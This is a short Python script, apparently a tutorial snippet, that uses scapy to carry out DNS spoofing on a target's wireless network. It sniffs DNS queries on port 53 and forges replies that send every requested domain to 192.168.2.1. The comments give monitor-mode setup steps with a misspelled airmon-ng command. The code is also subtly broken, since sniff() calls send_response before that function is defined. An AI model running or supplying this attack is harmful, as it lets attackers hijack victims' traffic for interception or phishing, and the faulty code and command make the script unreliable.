# In order to sniff your target’s wireless activity, you will need to setup your wireless card
# adapter to monitor mode. To do this, pull up airmon-ng from Kali Linux and then enter the
# following command.

# airmong-ng start wlan0

from scapy.all import *
sniff(prn=lambda x: send_response(x),
      lfilter=lambda x: x.haslayer(UDP) and x.dport == 53)


def send_response(x):
    # get requested domain
    req_domain = x[DNS].qd.qname
    spoofed_ip = '192.168.2.1'
    # Build response from a copy of original packet
    response = x.copy()
    # Start changing our response to be "from-ds" or from the AP
    response.FCfield = 2L
    # Switch the MAC Address
    response.addr1, response.addr2 = x.addr2, x.addr1
    # Switch the IP Address
    response.src, response.dst = x.dst, x.src
    # Switch the ports
    response.sport, response.dport = x.dport, x.sport
    # Set the DNS Flags
    response[DNS].qr = 1L
    response[DNS].ra = 1L
    response[DNS].ancount = 1
    # Make and add DNS answer
    response[DNS].an = DNSRR(
        rrname=req_domain,
        type="A",
        rclass='IN',
        ttl=900,
        rdata=spoofed_ip
    )
    sendp(response)
